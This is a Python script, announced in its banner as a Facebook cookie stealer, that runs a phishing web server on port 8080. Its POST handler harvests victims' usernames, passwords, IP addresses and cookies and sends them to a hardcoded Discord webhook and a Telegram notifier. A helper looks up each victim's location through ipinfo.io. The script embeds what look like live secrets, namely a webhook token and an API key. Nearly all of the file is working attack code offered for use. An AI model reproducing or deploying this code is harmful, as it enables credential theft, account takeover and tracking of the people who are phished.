def banner():
  class colors:
    indigo = "\033[1;35m"
    cyan = "\033[1;36m"
    
  print(colors.indigo + """
  ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗███████╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
  ██╔════╝██╔═══██╗██╔═══██╗██║ ██╔╝██║██╔════╝    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ██║     ██║   ██║██║   ██║█████╔╝ ██║█████╗      ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
  ██║     ██║   ██║██║   ██║██╔═██╗ ██║██╔══╝      ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
  ╚██████╗╚██████╔╝╚██████╔╝██║  ██╗██║███████╗    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
  ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝""")
  print(colors.cyan + u'\033[40m' + """
              ▄▄▄▄
            ▄██████     ▄▄▄█▄
          ▄██▀░░▀██▄    ████████▄
         ███░░░░░░██     █▀▀▀▀▀██▄▄
       ▄██▌░░░░░░░██    ▐▌       ▀█▄
       ███░░▐█░█▌░██    █▌         ▀▌
      ████░▐█▌░▐█▌██   ██
     ▐████░▐░░░░░▌██   █▌
      ████░░░██░░██▌  █▌
      ████░░░██░░██▌  █▌
      ████▌░▐█░░███   █
      ▐████░░▌░███   ██
      ████░░░███    █▌
    ██████▌░████   ██
  ▐████████████   ███
  █████████████▄████
  ██████████████████
  ██████████████████
  █████████████████▀
  █████████████████
  ████████████████
  ████████████████
  """);
  print("[+]A FB Cookie Stealer Created By PRINCE DEV[+]")

import http.server
import socketserver
import threading
import asyncio
import requests
import user_agent_parser
import logging
import json
import httpx

from urllib.parse import parse_qs

class PhishingServer(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        parsed_post = parse_qs(post_data)

        username = parsed_post.get('username', [''])[0]
        password = parsed_post.get('password', [''])[0]
        client_ip = self.client_address[0]
        cookies = self.headers.get('Cookie')
        
        print(f"Received credentials: Username: {username}, Password: {password}")
        print(f"Client IP: {client_ip}, Cookies: {cookies}")
        
        try:
            response_php = requests.post('http://127.0.0.1:8080/telegram_notification.php',
                                         data={'username': username, 'password': password},
                                         timeout=60)
            print(f"PHP script responded with: {response_php.text}")
        except requests.exceptions.RequestException as e:
            print(f"Failed to send data to PHP script: {str(e)}")

        # Send data to the Discord webhook
        webhook_url = 'https://discord.com/api/webhooks/1235067693263229008/vim49yy4ShUiFAjwyHXwAaBWaXZvk2o_tSj797O2WMx4s2YwcVJF_UKft__uWkhTU6bS'
        data_discord = {
            "content": f"Received credentials: Username: {username}, Password: {password}\nClient IP: {client_ip}, Cookies: {cookies}",
            "username": "Phishing Bot"
        }
        try:
            response_discord = requests.post(webhook_url, json=data_discord, timeout=60)
            print(f"Discord webhook response: {response_discord.text}")
        except requests.exceptions.RequestException as e:
            print(f"Failed to send data to Discord webhook: {str(e)}")

        # Respond to client
        self.send_response(302)
        self.send_header("Location", "thankyou.html")
        self.end_headers()

    def handle_geolocation_and_cookies(self, ip, cookies, username, password):
        # Fetch geolocation data from an API
        api_key = 'ad6d84aef27c16'
        response = requests.get(f"https://ipinfo.io/{ip}/json?token={api_key}")
        if response.status_code == 200:
            geo_data = response.json()
            location_data = geo_data.get('loc', 'Location data not available')
            print(f"Geolocation Data: {location_data}")
            self.send_to_discord(ip, cookies, location_data, username, password)
        else:
            print(f"Failed to get geolocation data: Status Code {response.status_code}")

    def send_to_discord(self, ip, cookies, location_data, username, password):
        # Format the data and send it to the Discord webhook
        webhook_url = 'https://discord.com/api/webhooks/1235067693263229008/vim49yy4ShUiFAjwyHXwAaBWaXZvk2o_tSj797O2WMx4s2YwcVJF_UKft__uWkhTU6bS'
        data_discord = {
            "content": f"Received credentials: Username: {username}, Password: {password}\nClient IP: {ip}, Cookies: {cookies}\nLocation: {location_data}",
            "username": "Phishing Bot"
        }
        try:
            response_discord = requests.post(webhook_url, json=data_discord, timeout=60)
            print(f"Discord webhook response: {response_discord.text}")
        except requests.exceptions.RequestException as e:
            print(f"Failed to send data to Discord webhook: {str(e)}")


if __name__ == "__main__":
    banner()
    server_address = ('', 8080)
    httpd = socketserver.TCPServer(server_address, PhishingServer)
    print("Server running on port 8080")
    httpd.serve_forever()